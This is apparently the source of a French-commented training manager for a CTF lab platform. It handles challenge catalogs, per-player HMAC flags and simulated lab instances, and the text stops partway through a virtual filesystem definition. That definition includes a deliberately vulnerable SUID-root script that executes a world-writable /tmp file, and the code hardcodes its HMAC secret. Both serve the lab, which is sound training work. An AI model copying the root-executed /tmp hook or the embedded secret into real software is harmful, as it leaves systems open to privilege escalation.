// ============================================================================
// CYBERLAB TRAINING PLATFORM - TRAINING MANAGER & ORCHESTRATION ENGINE
// Architecture Haute Fidélité : Gestion des Labs, Instances Docker & Fallback,
// Progression TryHackMe, Flags Dynamiques HMAC et Sécurité Locale.
// ============================================================================

const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');
const { exec } = require('node:child_process');

const CHALLENGES_ROOT = path.join(__dirname, '..', 'challenges');
const HMAC_SECRET = 'CYBERLAB_SUPER_SECRET_SALT_2026_REDTEAM';

function normalizeTaskId(id) {
  if (!id) return '';
  return String(id).trim().toLowerCase();
}

function taskIdsMatch(idA, idB) {
  if (!idA || !idB) return false;
  const a = normalizeTaskId(idA);
  const b = normalizeTaskId(idB);
  if (a === b) return true;
  const numA = a.replace(/^(task[-_]?|t)/, '');
  const numB = b.replace(/^(task[-_]?|t)/, '');
  return numA.length > 0 && numA === numB;
}

class TrainingManager {
  constructor(db) {
    this.db = db;
    this.instances = new Map(); // Empreinte mémoire des instances actives
    this.initTables();
    this.startGarbageCollector();
  }

  // 1. Initialisation des Tables SQLite pour la Zone Entraînement
  initTables() {
    if (!this.db) return;

    this.db.exec(`
      CREATE TABLE IF NOT EXISTS training_challenges (
        id TEXT PRIMARY KEY,
        title TEXT NOT NULL,
        category TEXT NOT NULL,
        difficulty TEXT NOT NULL,
        points INTEGER NOT NULL,
        duration_min INTEGER DEFAULT 45,
        learning_path TEXT,
        author TEXT DEFAULT 'CyberLab RedOps',
        tags TEXT DEFAULT '[]',
        prerequisites TEXT DEFAULT '[]',
        recommended_tools TEXT DEFAULT '[]',
        narrative_story TEXT,
        tasks_json TEXT NOT NULL,
        hints_json TEXT DEFAULT '[]',
        writeup_markdown TEXT,
        target_port INTEGER,
        virtual_ip TEXT,
        target_os TEXT DEFAULT 'Linux',
        machine_type TEXT DEFAULT 'room',
        organization TEXT DEFAULT 'CyberLab Target',
        cve TEXT,
        rating REAL DEFAULT 4.9,
        solves INTEGER DEFAULT 1200,
        monogram TEXT,
        created_at TEXT
      );

      CREATE TABLE IF NOT EXISTS training_learning_paths (
        id TEXT PRIMARY KEY,
        title TEXT NOT NULL,
        description TEXT NOT NULL,
        icon TEXT NOT NULL,
        difficulty TEXT NOT NULL,
        challenge_ids TEXT DEFAULT '[]',
        badge_reward TEXT
      );

      CREATE TABLE IF NOT EXISTS training_user_progress (
        challenge_id TEXT PRIMARY KEY,
        status TEXT DEFAULT 'not_started',
        tasks_completed TEXT DEFAULT '[]',
        unlocked_hints TEXT DEFAULT '[]',
        writeup_unlocked INTEGER DEFAULT 0,
        attempts_count INTEGER DEFAULT 0,
        points_earned INTEGER DEFAULT 0,
        solved_at TEXT,
        updated_at TEXT
      );

      CREATE TABLE IF NOT EXISTS training_instances (
        id TEXT PRIMARY KEY,
        challenge_id TEXT NOT NULL,
        container_id TEXT,
        virtual_ip TEXT,
        assigned_port INTEGER,
        started_at TEXT,
        expires_at TEXT,
        status TEXT DEFAULT 'running'
      );

      CREATE TABLE IF NOT EXISTS training_submissions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        challenge_id TEXT NOT NULL,
        task_id TEXT,
        submitted_flag TEXT NOT NULL,
        is_correct INTEGER NOT NULL,
        ip_address TEXT,
        timestamp TEXT
      );
      CREATE TABLE IF NOT EXISTS training_campaign_progress (
        player_id TEXT,
        box_id TEXT,
        act INTEGER,
        offensive_status TEXT DEFAULT 'not_started',
        soc_investigation_status TEXT DEFAULT 'pending',
        detection_status TEXT DEFAULT 'pending',
        remediation_status TEXT DEFAULT 'pending',
        artifacts_unlocked TEXT DEFAULT '[]',
        points_earned INTEGER DEFAULT 0,
        completed_at TEXT,
        updated_at TEXT,
        PRIMARY KEY (player_id, box_id)
      );
    `);

    // Migration transparente des colonnes pour bases existantes
    const extraCols = [
      'target_os TEXT DEFAULT "Linux"',
      'machine_type TEXT DEFAULT "room"',
      'organization TEXT DEFAULT "CyberLab Target"',
      'cve TEXT',
      'rating REAL DEFAULT 4.9',
      'solves INTEGER DEFAULT 1200',
      'monogram TEXT',
      'act INTEGER DEFAULT 0',
      'season INTEGER DEFAULT 1',
      'mitre_tags TEXT DEFAULT "[]"',
      'owasp_tags TEXT DEFAULT "[]"',
      'mission_order TEXT',
      'rules_of_engagement TEXT',
      'debrief_json TEXT DEFAULT "{}"',
      'defense_json TEXT DEFAULT "{}"',
      'artifacts_json TEXT DEFAULT "[]"'
    ];
    for (const col of extraCols) {
      try {
        this.db.exec(`ALTER TABLE training_challenges ADD COLUMN ${col};`);
      } catch (e) {}
    }

    // Synchronisation automatique des challenges sur disque vers la base
    this.syncChallengesFromDisk();
    this.seedLearningPaths();
  }

  // 2. Génération de Flag Dynamique unique par joueur (Anti-Triche HMAC-SHA256)
  generateDynamicFlag(challengeId, taskIdOrCanonical, canonicalOrPlayer, maybePlayer) {
    let taskId = 't1';
    let canonicalFlag = '';
    let playerId = 'current_player';

    if (maybePlayer !== undefined) {
      taskId = taskIdOrCanonical || 't1';
      canonicalFlag = canonicalOrPlayer || '';
      playerId = maybePlayer || 'current_player';
    } else if (typeof canonicalOrPlayer === 'string' && (canonicalOrPlayer.startsWith('CYBER') || canonicalOrPlayer.startsWith('AEGIS') || canonicalOrPlayer.startsWith('FLAG') || canonicalOrPlayer.startsWith('KEY') || canonicalOrPlayer.startsWith('SIGMA') || canonicalOrPlayer.startsWith('YARA') || canonicalOrPlayer.startsWith('REMEDIATION') || canonicalOrPlayer.includes('{'))) {
      taskId = taskIdOrCanonical || 't1';
      canonicalFlag = canonicalOrPlayer;
      playerId = 'current_player';
    } else {
      canonicalFlag = taskIdOrCanonical || '';
      playerId = canonicalOrPlayer || 'current_player';
      taskId = 't1';
    }

    if (!canonicalFlag) return 'CYBERLAB{DEFAULT_FLAG}';
    
    const cleanPlayer = (playerId || 'current_player').toLowerCase().trim();
    const cleanChallenge = (challengeId || '').toLowerCase().trim();
    const cleanTask = (taskId || '').toLowerCase().trim();

    const hash = crypto.createHmac('sha256', HMAC_SECRET)
      .update(`${cleanChallenge}:${cleanTask}:${cleanPlayer}`)
      .digest('hex')
      .slice(0, 8);

    const match = canonicalFlag.match(/^([A-Z0-9_]+)\{([\s\S]+)\}$/);
    if (match) {
      const prefix = match[1];
      const body = match[2];
      return `${prefix}{${body}_${hash}}`;
    }
    return `CYBERLAB{${canonicalFlag}_${hash}}`;
  }

  // 3. Synchronisation de tous les challenges définis dans /challenges vers SQLite
  syncChallengesFromDisk() {
    if (!fs.existsSync(CHALLENGES_ROOT)) return;

    const categories = fs.readdirSync(CHALLENGES_ROOT, { withFileTypes: true })
      .filter(d => d.isDirectory())
      .map(d => d.name);

    for (const cat of categories) {
      const catDir = path.join(CHALLENGES_ROOT, cat);
      const challengeDirs = fs.readdirSync(catDir, { withFileTypes: true })
        .filter(d => d.isDirectory())
        .map(d => d.name);

      for (const chId of challengeDirs) {
        const chPath = path.join(catDir, chId);
        const metaPath = path.join(chPath, 'meta.json');
        const tasksPath = path.join(chPath, 'tasks.json');
        const hintsPath = path.join(chPath, 'hints.json');
        const writeupPath = path.join(chPath, 'writeup.md');

        if (!fs.existsSync(metaPath)) continue;

        try {
          const meta = JSON.parse(fs.readFileSync(metaPath, 'utf8'));
          const tasks = fs.existsSync(tasksPath) ? JSON.parse(fs.readFileSync(tasksPath, 'utf8')) : [];
          const hints = fs.existsSync(hintsPath) ? JSON.parse(fs.readFileSync(hintsPath, 'utf8')) : [];
          const writeup = fs.existsSync(writeupPath) ? fs.readFileSync(writeupPath, 'utf8') : 'Writeup en cours de rédaction.';

          const stmt = this.db.prepare(`
            INSERT INTO training_challenges (
              id, title, category, difficulty, points, duration_min, learning_path, author,
              tags, prerequisites, recommended_tools, narrative_story, tasks_json, hints_json,
              writeup_markdown, target_port, virtual_ip, target_os, machine_type, organization, cve, rating, solves, monogram,
              act, season, mitre_tags, owasp_tags, mission_order, rules_of_engagement, debrief_json, defense_json, artifacts_json, created_at
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(id) DO UPDATE SET
              title = excluded.title,
              category = excluded.category,
              difficulty = excluded.difficulty,
              points = excluded.points,
              duration_min = excluded.duration_min,
              learning_path = excluded.learning_path,
              author = excluded.author,
              tags = excluded.tags,
              prerequisites = excluded.prerequisites,
              recommended_tools = excluded.recommended_tools,
              narrative_story = excluded.narrative_story,
              tasks_json = excluded.tasks_json,
              hints_json = excluded.hints_json,
              writeup_markdown = excluded.writeup_markdown,
              target_port = excluded.target_port,
              virtual_ip = excluded.virtual_ip,
              target_os = excluded.target_os,
              machine_type = excluded.machine_type,
              organization = excluded.organization,
              cve = excluded.cve,
              rating = excluded.rating,
              solves = excluded.solves,
              monogram = excluded.monogram,
              act = excluded.act,
              season = excluded.season,
              mitre_tags = excluded.mitre_tags,
              owasp_tags = excluded.owasp_tags,
              mission_order = excluded.mission_order,
              rules_of_engagement = excluded.rules_of_engagement,
              debrief_json = excluded.debrief_json,
              defense_json = excluded.defense_json,
              artifacts_json = excluded.artifacts_json
          `);

          stmt.run(
            meta.id || chId,
            meta.title || chId,
            meta.category || cat,
            meta.difficulty || 'beginner',
            meta.points || 100,
            meta.duration_min || 45,
            meta.learning_path || null,
            meta.author || 'CyberLab RedOps',
            JSON.stringify(meta.tags || []),
            JSON.stringify(meta.prerequisites || []),
            JSON.stringify(meta.recommended_tools || []),
            meta.narrative_story || '',
            JSON.stringify(tasks),
            JSON.stringify(hints),
            writeup,
            meta.target_port || 80,
            meta.virtual_ip || '10.10.10.10',
            meta.target_os || 'Linux',
            meta.machine_type || 'room',
            meta.organization || 'CyberLab Target',
            meta.cve || null,
            meta.rating || 4.9,
            meta.solves || 1200,
            meta.monogram || (meta.id || chId).substring(0, 4).toUpperCase(),
            meta.act || 0,
            meta.season || 1,
            JSON.stringify(meta.mitre_tags || []),
            JSON.stringify(meta.owasp_tags || []),
            meta.mission_order || '',
            meta.rules_of_engagement || '',
            JSON.stringify(meta.debrief_json || {}),
            JSON.stringify(meta.defense_tasks || {}),
            JSON.stringify(meta.artifacts_discovered || []),
            new Date().toISOString()
          );
        } catch (e) {
          console.warn(`[TRAINING] Erreur chargement challenge ${chId}:`, e.message);
        }
      }
    }
  }

  // 4. Seeding des Learning Paths (Parcours d'Apprentissage TryHackMe)
  seedLearningPaths() {
    const paths = [
      {
        id: 'web-beginner',
        title: 'Web Application Security & Pentest Moderne',
        description: 'Maîtrisez l\'audit du Web OWASP Top 10 : SQLi, XSS, SSRF, IDOR, LFI et contournements d\'authentification.',
        icon: 'globe',
        difficulty: 'beginner',
        challenge_ids: ['web-01-robots', 'web-02-sqli-login', 'web-03-sqli-union', 'web-04-stored-xss', 'web-05-lfi-wrapper', 'web-06-sqli-blind-boolean', 'web-25-java-spring4shell'],
        badge_reward: 'Web Security Specialist'
      },
      {
        id: 'soc-forensics',
        title: 'SOC Analyst, Forensics & Blue Team Defense',
        description: 'Devenez analyste de détection d\'élite : analyse de flux PCAP, mémoire vive, règles Sigma/YARA, triage de ransomware et canary deception.',
        icon: 'shield',
        difficulty: 'easy',
        challenge_ids: ['net-01-wireshark-ftp', 'forensics-01-magic-bytes', 'forensics-02-pcap-http', 'blue-01-auth-log-brute', 'purple-01-canary-deception', 'purple-02-bas-credential-dump', 'purple-03-kerberoast-detection', 'purple-04-active-mitigation-c2'],
        badge_reward: 'Blue Sentinel Guardian'
      },
      {
        id: 'crypto-osint-core',
        title: 'OSINT, Renseignement & Enquêtes Numériques',
        description: 'Méthodologie d\'investigation en sources ouvertes : métadonnées géographiques, empreintes d\'entreprises, fuites Dark Web, traçage et cryptanalyse.',
        icon: 'search',
        difficulty: 'beginner',
        challenge_ids: ['osint-01-exif-trace', 'crypto-01-rot-vault', 'crypto-02-xor-cracker', 'phish-01-ceo-fraud', 'osint-04-social-footprint', 'osint-05-darkweb-leak', 'osint-06-flight-marine-tracking', 'osint-07-corporate-dns-recon'],
        badge_reward: 'Shadow Intelligence Investigator'
      },
      {
        id: 'systems-reversing',
        title: 'Systèmes Linux & Rétro-Ingénierie Binaire',
        description: 'Exploite les configurations imprudentes de privilèges et dissèque la logique interne des exécutables.',
        icon: 'terminal',
        difficulty: 'easy',
        challenge_ids: ['linux-01-suid-bash', 'rev-01-js-packer', 'linux-02-cron-wildcard', 'api-01-bola-profile'],
        badge_reward: 'Binary Navigator Pro'
      },
      {
        id: 'pwn-binary',
        title: 'Exploitation Binaire & Pwn d\'Élite',
        description: 'Maîtrise les dépassements de tampon, ret2libc, ROP chains x64 et la corruption de tas (Heap UAF/Fastbins).',
        icon: 'cpu',
        difficulty: 'hard',
        challenge_ids: ['pwn-01-bof-stack-simple', 'pwn-02-ret2libc-x86', 'pwn-03-format-string', 'pwn-04-rop-x64-execve', 'pwn-05-heap-uaf'],
        badge_reward: 'Binary Exploit Architect'
      },
      {
        id: 'ad-enterprise',
        title: 'Attaque d\'Active Directory & Mouvement Latéral',
        description: 'Infiltre des domaines Windows : AS-REP Roasting, Kerberoasting, DCSync, abus de GPO et élévation de privilèges.',
        icon: 'server',
        difficulty: 'intermediate',
        challenge_ids: ['win-01-ad-asrep', 'win-02-ad-kerberoast', 'win-03-ad-dcsync', 'win-04-unquoted-service-path', 'win-05-ad-gpo-abuse'],
        badge_reward: 'Domain Master Operator'
      },
      {
        id: 'cloud-container',
        title: 'Sécurité Cloud, Conteneurs & Évasion',
        description: 'Explore les buckets S3/GCS fuyants, évasions de socket Docker, élévations RBAC Kubernetes et rôles IAM cross-account.',
        icon: 'layers',
        difficulty: 'hard',
        challenge_ids: ['cloud-01-s3-open-bucket', 'cloud-02-git-history-leak', 'cloud-03-docker-socket-escape', 'cloud-04-k8s-service-account', 'cloud-05-aws-iam-role-assumption'],
        badge_reward: 'Cloud Defense Specialist'
      },
      {
        id: 'wifi-network-ops',
        title: 'Audit Sans-Fil & Pivoting Réseau',
        description: 'Capture et cassage de 4-way handshakes WPA2, détection de rogue AP / Evil Twin et tunneling SOCKS5 multi-hop.',
        icon: 'wifi',
        difficulty: 'intermediate',
        challenge_ids: ['net-09-wifi-wpa2-handshake', 'net-10-rogue-ap-investigation', 'net-05-ssh-pivoting'],
        badge_reward: 'Wireless & Pivot Specialist'
      },
      {
        id: 'ai-llm-security',
        title: 'Sécurité de l\'IA & Résilience des LLM',
        description: 'Exploitation et sécurisation de modèles de langage : injections de prompt directes/indirectes, jailbreaks et garde-fous DLP.',
        icon: 'cpu',
        difficulty: 'hard',
        challenge_ids: ['ai-01-prompt-injection', 'ai-02-jailbreak-data-exfil'],
        badge_reward: 'Certified AI Red Team Operator'
      },
      {
        id: 'social-phishing-defense',
        title: 'Ingénierie Sociale & Défense Anti-Phishing',
        description: 'Dissection d\'en-têtes SPF/DKIM/DMARC falsifiés, neutralisation de pièces jointes à macros VBS et politique DMARC p=reject.',
        icon: 'mail',
        difficulty: 'easy',
        challenge_ids: ['phish-01-ceo-fraud', 'phish-02-credential-harvest', 'phish-03-macro-attachment'],
        badge_reward: 'Anti-Phishing Sentinel'
      },
      {
        id: 'ethics-legal-compliance',
        title: 'Cadre Légal, STAD, RGPD & Directive NIS 2',
        description: 'Droit du numérique en France et UE : infractions aux STAD (Code pénal 323-1), notification ANSSI NIS 2 sous 24h et mandats éthiques.',
        icon: 'shield',
        difficulty: 'beginner',
        challenge_ids: ['law-01-stad-godfrain-compliance', 'law-02-nis2-incident-notification'],
        badge_reward: 'Cyber Law & Ethics Compliance Officer'
      },
      {
        id: 'master-boot2root',
        title: 'Red Team Operator, Labs d\'Attaque Réelle & Boot2Root',
        description: 'Compromission d\'infrastructures d\'entreprises complètes multi-pages : PayShield FinTech, MedHealth EHR, CyberCorp ERP, AeroSpace SCADA, élévation Dirty Pipe et Vault.',
        icon: 'target',
        difficulty: 'insane',
        challenge_ids: ['real-01-fintech-gateway', 'real-02-medhealth-ehr', 'real-03-cybercorp-erp', 'real-04-aerospace-telemetry', 'red-01-dirty-pipe-exploit', 'red-02-capabilities-tar-privesc', 'b2r-01-enterprise-alpha', 'b2r-02-shadow-corp-dmz', 'b2r-03-the-master-vault', 'linux-07-kernel-dirty-pipe', 'web-25-java-spring4shell'],
        badge_reward: 'Master Red Team Operator'
      }
    ];

    const stmt = this.db.prepare(`
      INSERT INTO training_learning_paths (id, title, description, icon, difficulty, challenge_ids, badge_reward)
      VALUES (?, ?, ?, ?, ?, ?, ?)
      ON CONFLICT(id) DO UPDATE SET
        title = excluded.title,
        description = excluded.description,
        icon = excluded.icon,
        difficulty = excluded.difficulty,
        challenge_ids = excluded.challenge_ids,
        badge_reward = excluded.badge_reward
    `);

    for (const p of paths) {
      stmt.run(p.id, p.title, p.description, p.icon, p.difficulty, JSON.stringify(p.challenge_ids), p.badge_reward);
    }
  }

  // 5. Récupération du catalogue avec filtres & statut joueur
  getCatalog(filters = {}) {
    let sql = 'SELECT * FROM training_challenges WHERE 1=1';
    const params = [];

    if (filters.category && filters.category !== 'all') {
      sql += ' AND category = ?';
      params.push(filters.category);
    }

    if (filters.difficulty && filters.difficulty !== 'all') {
      sql += ' AND difficulty = ?';
      params.push(filters.difficulty);
    }

    if (filters.learning_path && filters.learning_path !== 'all') {
      sql += ' AND learning_path = ?';
      params.push(filters.learning_path);
    }

    if (filters.search) {
      sql += ' AND (title LIKE ? OR tags LIKE ? OR narrative_story LIKE ?)';
      const term = `%${filters.search.trim()}%`;
      params.push(term, term, term);
    }

    sql += ' ORDER BY points ASC, id ASC';

    const rows = this.db.prepare(sql).all(...params);

    // Injection de la progression du joueur pour chaque challenge
    const progressList = this.db.prepare('SELECT * FROM training_user_progress').all();
    const progressMap = new Map();
    progressList.forEach(p => progressMap.set(p.challenge_id, p));

    return rows.map(r => {
      const prog = progressMap.get(r.id) || { status: 'not_started', tasks_completed: '[]', points_earned: 0 };
      const tasks = JSON.parse(r.tasks_json || '[]');
      const completedTasks = JSON.parse(prog.tasks_completed || '[]');

      return {
        id: r.id,
        title: r.title,
        category: r.category,
        difficulty: r.difficulty,
        points: r.points,
        duration_min: r.duration_min,
        learning_path: r.learning_path,
        author: r.author,
        tags: JSON.parse(r.tags || '[]'),
        recommended_tools: JSON.parse(r.recommended_tools || '[]'),
        task_count: tasks.length,
        completed_task_count: completedTasks.length,
        status: prog.status,
        points_earned: prog.points_earned || 0,
        target_os: r.target_os || 'Linux',
        machine_type: r.machine_type || 'room',
        organization: r.organization || 'CyberLab Target',
        cve: r.cve || null,
        rating: r.rating || 4.9,
        solves: r.solves || 1200,
        monogram: r.monogram || r.id.substring(0, 4).toUpperCase(),
        act: r.act || 0,
        season: r.season || 1,
        mitre_tags: JSON.parse(r.mitre_tags || '[]'),
        owasp_tags: JSON.parse(r.owasp_tags || '[]'),
        mission_order: r.mission_order || '',
        rules_of_engagement: r.rules_of_engagement || '',
        debrief: JSON.parse(r.debrief_json || '{}'),
        defense_tasks: JSON.parse(r.defense_json || '{}'),
        artifacts: JSON.parse(r.artifacts_json || '[]')
      };
    });
  }

  // 6. Récupération des détails complets d'un challenge pour la vue Room
  getChallengeRoom(challengeId, playerNickname = 'Opérateur RedTeam') {
    const ch = this.db.prepare('SELECT * FROM training_challenges WHERE id = ?').get(challengeId);
    if (!ch) return null;

    const prog = this.db.prepare('SELECT * FROM training_user_progress WHERE challenge_id = ?').get(challengeId) || {
      status: 'not_started',
      tasks_completed: '[]',
      unlocked_hints: '[]',
      writeup_unlocked: 0,
      points_earned: 0
    };

    const tasks = JSON.parse(ch.tasks_json || '[]');
    const hints = JSON.parse(ch.hints_json || '[]');
    const completedTasks = new Set(JSON.parse(prog.tasks_completed || '[]'));
    const unlockedHints = new Set(JSON.parse(prog.unlocked_hints || '[]'));

    // Sécurisation des flags : on ne renvoie JAMAIS les flags bruts au client
    const safeTasks = tasks.map(t => {
      const isCompleted = [...completedTasks].some(cId => taskIdsMatch(cId, t.id));
      const canon = (t.flag || t.canonical_flag || '').trim();
      let format = 'Format attendu : CTF{...}';
      if (canon.startsWith('CYBERLAB{') || canon.startsWith('CTF{') || canon.startsWith('FLAG{') || canon.startsWith('AEGIS{') || canon.startsWith('CHIMERA{')) {
        format = 'Format : CTF{...}';
      } else if (canon.startsWith('DEFENSE{') || canon.startsWith('REMEDIATION{') || canon.startsWith('SIGMA{') || canon.startsWith('YARA{')) {
        format = 'Format : DEFENSE{...}';
      } else if (canon.includes('.') && !canon.includes(' ') && !canon.includes('{')) {
        format = 'Format : nom_de_fichier / domaine';
      } else if (!canon.includes('{') && canon.length > 0) {
        format = 'Format : Texte / Réponse directe';
      }

      return {
        id: t.id,
        title: t.title,
        description: t.description,
        points: t.points || 0,
        is_completed: isCompleted,
        requires_flag: !!t.flag || !!t.canonical_flag,
        task_type: t.task_type || 'flag',
        flag_format: format,
        is_defense: Boolean(t.is_defense || t.id === 't4' || t.id === 't5' || t.id === 't6' || (t.title || '').toLowerCase().includes('défense') || (t.title || '').toLowerCase().includes('protéger') || (t.title || '').toLowerCase().includes('remédiation'))
      };
    });

    // Masquage du texte des indices non débloqués (100% GRATUIT)
    const safeHints = hints.map((h, idx) => ({
      index: idx,
      title: h.title || `Indice n°${idx + 1}`,
      cost: 0,
      is_free: true,
      is_unlocked: unlockedHints.has(idx),
      content: unlockedHints.has(idx) ? h.content : null
    }));

    // Vérification d'une instance active pour ce challenge
    const instance = this.getInstance(challengeId);

    // Détection des fichiers téléchargeables dans challenges/*/:challengeId/files
    let downloadableFiles = [];
    try {
      const categories = fs.readdirSync(CHALLENGES_ROOT);
      for (const cat of categories) {
        const filesPath = path.join(CHALLENGES_ROOT, cat, ch.id, 'files');
        if (fs.existsSync(filesPath)) {
          const files = fs.readdirSync(filesPath);
          downloadableFiles = files.map(f => {
            const stat = fs.statSync(path.join(filesPath, f));
            const sizeKb = Math.round(stat.size / 1024);
            return {
              name: f,
              url: `/targets/training/download/${cat}/${ch.id}/${f}`,
              download_url: `/targets/training/download/${cat}/${ch.id}/${f}`,
              size: sizeKb > 1024 ? `${(sizeKb / 1024).toFixed(1)} Mo` : `${sizeKb || 1} Ko`
            };
          });
          break;
        }
      }
    } catch (_) {}

    return {
      id: ch.id,
      title: ch.title,
      category: ch.category,
      difficulty: ch.difficulty,
      points: ch.points,
      duration_min: ch.duration_min,
      learning_path: ch.learning_path,
      author: ch.author,
      tags: JSON.parse(ch.tags || '[]'),
      prerequisites: JSON.parse(ch.prerequisites || '[]'),
      recommended_tools: JSON.parse(ch.recommended_tools || '[]'),
      narrative_story: ch.narrative_story,
      description: ch.narrative_story || ch.mission_order || '',
      scenario: ch.mission_order || ch.narrative_story || '',
      tasks: safeTasks,
      hints: safeHints,
      downloadable_files: downloadableFiles,
      writeup_unlocked: prog.writeup_unlocked === 1,
      status: prog.status,
      points_earned: prog.points_earned || 0,
      instance: instance,
      target_os: ch.target_os || 'Linux',
      machine_type: ch.machine_type || 'room',
      organization: ch.organization || 'CyberLab Target',
      cve: ch.cve || null,
      rating: ch.rating || 4.9,
      solves: ch.solves || 1200,
      monogram: ch.monogram || ch.id.substring(0, 4).toUpperCase(),
      act: ch.act || 0,
      season: ch.season || 1,
      mitre_tags: JSON.parse(ch.mitre_tags || '[]'),
      owasp_tags: JSON.parse(ch.owasp_tags || '[]'),
      mission_order: ch.mission_order || '',
      rules_of_engagement: ch.rules_of_engagement || '',
      debrief: JSON.parse(ch.debrief_json || '{}'),
      debrief_json: JSON.parse(ch.debrief_json || '{}'),
      defense_tasks: JSON.parse(ch.defense_json || '{}'),
      defense_json: JSON.parse(ch.defense_json || '{}'),
      artifacts: JSON.parse(ch.artifacts_json || '[]')
    };
  }

  // 7. Cycle de vie des machines de challenge (Start, Stop, Renew)
  startInstance(challengeId) {
    const ch = this.db.prepare('SELECT * FROM training_challenges WHERE id = ?').get(challengeId);
    if (!ch) throw new Error('Challenge introuvable.');

    // Si une instance existe déjà et n'est pas expirée, on la réutilise
    const existing = this.getInstance(challengeId);
    if (existing && existing.status === 'running') {
      return existing;
    }

    const instanceId = 'inst_' + crypto.randomBytes(6).toString('hex');
    const now = Date.now();
    const expiresAt = new Date(now + 60 * 60 * 1000).toISOString(); // 60 minutes
    const startedAt = new Date(now).toISOString();

    // Assignation d'une IP interne réaliste dans le sous-réseau du lab (10.10.X.Y)
    const octet3 = 10 + Math.floor(Math.random() * 50);
    const octet4 = 2 + Math.floor(Math.random() * 250);
    const virtualIp = `10.10.${octet3}.${octet4}`;

    // Port d'accès local sur la machine hôte
    const assignedPort = ch.target_port || (4000 + Math.floor(Math.random() * 2000));

    const instanceData = {
      id: instanceId,
      challenge_id: challengeId,
      runtime: 'simulation',
      container_id: 'simulation_' + instanceId,
      virtual_ip: virtualIp,
      assigned_port: assignedPort,
      started_at: startedAt,
      expires_at: expiresAt,
      status: 'running',
      vfs_injection: this.getChallengeVfsSnapshot(challengeId, 'current_player')
    };

    // Sauvegarde en base et cache mémoire
    this.db.prepare(`
      INSERT INTO training_instances (id, challenge_id, container_id, virtual_ip, assigned_port, started_at, expires_at, status)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
      ON CONFLICT(id) DO UPDATE SET
        virtual_ip = excluded.virtual_ip,
        assigned_port = excluded.assigned_port,
        expires_at = excluded.expires_at,
        status = excluded.status
    `).run(instanceId, challengeId, instanceData.container_id, virtualIp, assignedPort, startedAt, expiresAt, 'running');

    this.instances.set(challengeId, instanceData);
    return this.getInstance(challengeId);
  }

  stopInstance(challengeId) {
    this.db.prepare('UPDATE training_instances SET status = ? WHERE challenge_id = ?').run('stopped', challengeId);
    this.instances.delete(challengeId);
    return { success: true, message: 'Machine arrêtée avec succès.' };
  }

  renewInstance(challengeId) {
    const inst = this.getInstance(challengeId);
    if (!inst || inst.status !== 'running') {
      throw new Error('Aucune machine en cours d\'exécution pour ce challenge.');
    }

    const currentExpire = new Date(inst.expires_at).getTime();
    const newExpire = new Date(Math.min(Date.now() + 2 * 60 * 60 * 1000, currentExpire + 15 * 60 * 1000)).toISOString();

    this.db.prepare('UPDATE training_instances SET expires_at = ? WHERE challenge_id = ?').run(newExpire, challengeId);
    inst.expires_at = newExpire;
    this.instances.set(challengeId, inst);

    return this.getInstance(challengeId);
  }

  resetInstance(challengeId) {
    this.stopInstance(challengeId);
    return this.startInstance(challengeId);
  }

  getInstance(challengeId) {
    const row = this.db.prepare('SELECT * FROM training_instances WHERE challenge_id = ? AND status = ? ORDER BY started_at DESC LIMIT 1').get(challengeId, 'running');
    if (!row) return null;

    const expiresTime = new Date(row.expires_at).getTime();
    const remainingSeconds = Math.max(0, Math.floor((expiresTime - Date.now()) / 1000));

    if (remainingSeconds <= 0) {
      this.stopInstance(challengeId);
      return null;
    }

    return {
      id: row.id,
      runtime: 'simulation',
      challenge_id: row.challenge_id,
      virtual_ip: row.virtual_ip,
      assigned_port: row.assigned_port,
      started_at: row.started_at,
      expires_at: row.expires_at,
      remaining_seconds: remainingSeconds,
      status: 'running',
      vfs_injection: this.getChallengeVfsSnapshot(challengeId, 'current_player')
    };
  }

  // 7.1 Snapshot VFS avec injection dynamique des drapeaux par joueur
  getChallengeVfsSnapshot(challengeId, playerId = 'current_player') {
    const ch = this.db.prepare('SELECT * FROM training_challenges WHERE id = ?').get(challengeId);
    if (!ch) return {};

    const files = {};
    const tasks = JSON.parse(ch.tasks_json || '[]');

    const userTask = tasks.find(t => t.id === 't2' || (t.title || '').toLowerCase().includes('user')) || tasks[0];
    const rootTask = tasks.find(t => t.id === 't3' || (t.title || '').toLowerCase().includes('root')) || tasks[1];

    const userCanon = userTask ? (userTask.flag || userTask.canonical_flag || 'FLAG{USER}') : 'FLAG{USER}';
    const rootCanon = rootTask ? (rootTask.flag || rootTask.canonical_flag || 'FLAG{ROOT}') : 'FLAG{ROOT}';

    const userFlag = this.generateDynamicFlag(challengeId, userTask ? userTask.id : 't2', userCanon, playerId);
    const rootFlag = this.generateDynamicFlag(challengeId, rootTask ? rootTask.id : 't3', rootCanon, playerId);

    // Flags dynamiques standard
    files['/home/operator/user.txt'] = {
      content: userFlag + '\n',
      permissions: '0644',
      owner: 'operator',
      group: 'operator'
    };

    files['/root/root.txt'] = {
      content: rootFlag + '\n',
      permissions: '0600',
      owner: 'root',
      group: 'root'
    };

    files['/root/flag.txt'] = {
      content: rootFlag + '\n',
      permissions: '0600',
      owner: 'root',
      group: 'root'
    };

    // Injections narratives spécifiques aux boxes de la Saison 1
    if (challengeId === 'aegis-box-01-perimeter') {
      files['/home/operator/gatekeeper_config.json'] = {
        content: JSON.stringify({
          service: 'Gatekeeper Telemetry Gateway',
          version: '2.4.1',
          internal_pivot_target: '10.10.10.60 (core-nexus.internal.aegis)',
          auth_endpoint: '/portal/api/exchange',
          status: 'compromised_by_chimera'
        }, null, 2),
        permissions: '0644',
        owner: 'operator',
        group: 'operator'
      };

      files['/usr/local/bin/aegis-sync'] = {
        content: '#!/bin/bash\n# Aegis Gatekeeper Telemetry Sync Daemon (SUID root)\nif [ -f /tmp/sync_hook ]; then\n  /bin/sh /tmp/sync_hook\nfi\necho "[AEGIS-SYNC] Synchronisation des certificats de passerelle terminee."\n',
        permissions: '4755',
        owner: 'root',
        group: 'root',
        suid: true
      };

      files['/var/log/nginx/access.log'] = {
